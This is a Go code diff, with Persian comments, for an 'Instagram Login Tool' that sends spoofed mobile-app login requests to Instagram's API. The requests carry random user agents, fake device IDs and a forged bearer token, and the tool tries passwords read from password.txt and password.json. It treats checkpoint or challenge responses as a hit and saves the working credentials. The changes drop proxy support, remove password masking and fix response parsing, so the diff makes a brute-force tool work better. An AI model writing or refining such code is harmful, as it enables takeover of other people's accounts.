@@ -53,7 +53,7 @@ type LoginResult struct {
 func main() {
 	setupLogger()
 
-	fmt.Println("=== Instagram Login Tool (Improved Headers) ===")
+	fmt.Println("=== Instagram Login Tool (No Proxy) ===")
 	fmt.Printf("Time: %s\n", CURRENT_TIME)
 	fmt.Printf("User: %s\n\n", CURRENT_USER)
 
@@ -157,7 +157,7 @@ func waitGroupTimeout(wg *sync.WaitGroup, timeout time.Duration) <-chan struct{}
 	return done
 }
 
-// ===== هدرهای تخصصی و پارامترهای پویا =====
+// == نسخه بدون پراکسی ==
 func tryLoginSpecial(username, password string) LoginResult {
 	loginUrl := API_URL + "accounts/login/"
 	data := url.Values{}
@@ -167,8 +167,6 @@ func tryLoginSpecial(username, password string) LoginResult {
 	androidID := "android-" + uuid.New().String()[:16]
 	sessionID := uuid.New().String()
 	familyID := uuid.New().String()
-	// فرض: کوکی نداریم، ولی اگر داشتی اینجا می‌توانی قرار دهی
-	// برای تست bearer token می‌توانی این را به صورت آزمایشی بسازی
 	cookieJSON, _ := json.Marshal(map[string]string{
 		"ds_user_id":  "0",
 		"sessionid":   "0",
@@ -181,7 +179,7 @@ func tryLoginSpecial(username, password string) LoginResult {
 		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Request error"}
 	}
 
-	// هدرهای تخصصی شبیه نمونه Python
+	// هدرهای تخصصی
 	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
 	req.Header.Set("Accept", "*/*")
@@ -206,7 +204,8 @@ func tryLoginSpecial(username, password string) LoginResult {
 	req.Header.Set("Authorization", "Bearer IGT:2:"+bearer)
 	req.Header.Set("X-FB-HTTP-Engine", "Liger")
 
-	client := &http.Client{Timeout: TIMEOUT}
+	client := &http.Client{Timeout: TIMEOUT} // بدون پراکسی
+
 	resp, err := client.Do(req)
 	if err != nil {
 		log.Printf("Error sending request: %v\n", err)
@@ -220,17 +219,21 @@ func tryLoginSpecial(username, password string) LoginResult {
 		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Read error"}
 	}
 
-	log.Printf("Raw response: %s\n", string(body))
+	bodyStr := string(body)
+	// باگ قبلی: اگر متن پاسخ JSON نبود، بیخود تلاش به Unmarshal نکن!
+	if !strings.HasPrefix(bodyStr, "{") {
+		log.Printf("Raw response: %s", bodyStr)
+		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: bodyStr}
+	}
 
 	var response InstagramResponse
 	if err := json.Unmarshal(body, &response); err != nil {
-		log.Printf("Error parsing response: %v\n", err)
+		log.Printf("Error parsing response: %v", err)
 		return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: "Parse error"}
 	}
 
-	success := response.Status == "ok" || strings.Contains(string(body), "logged_in_user")
-
-	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
+	success := response.Status == "ok" || strings.Contains(bodyStr, "logged_in_user")
+	if success || response.Message == "challenge_required" || response.ErrorType == "challenge_required" || response.ErrorType == "checkpoint_challenge_required" {
 		return LoginResult{Username: username, Password: password, Success: true, Time: CURRENT_TIME, Message: "challenge or success"}
 	}
 
@@ -244,11 +247,9 @@ func tryLoginSpecial(username, password string) LoginResult {
 	return LoginResult{Username: username, Password: password, Success: false, Time: CURRENT_TIME, Message: msg}
 }
 
-// بخش‌های کمکی و مدیریتی
 func loadPasswords() []string {
 	var passwords []string
 
-	// Try to load from password.txt
 	file, err := os.Open("password.txt")
 	if err == nil {
 		defer file.Close()
@@ -263,7 +264,6 @@ func loadPasswords() []string {
 		log.Printf("Error opening password file: %v", err)
 	}
 
-	// Try to load from password.json (optional)
 	fileJSON, errj := os.Open("password.json")
 	if errj == nil {
 		defer fileJSON.Close()
@@ -294,13 +294,6 @@ func saveResultJSON(result LoginResult) {
 
 func trim(s string) string {
 	return strings.TrimSpace(s)
-}
-
-func maskPassword(password string) string {
-	if len(password) <= 4 {
-		return "****"
-	}
-	return password[:2] + strings.Repeat("*", len(password)-4) + password[len(password)-2:]
 }
 
 func printProgress(current, total int) {
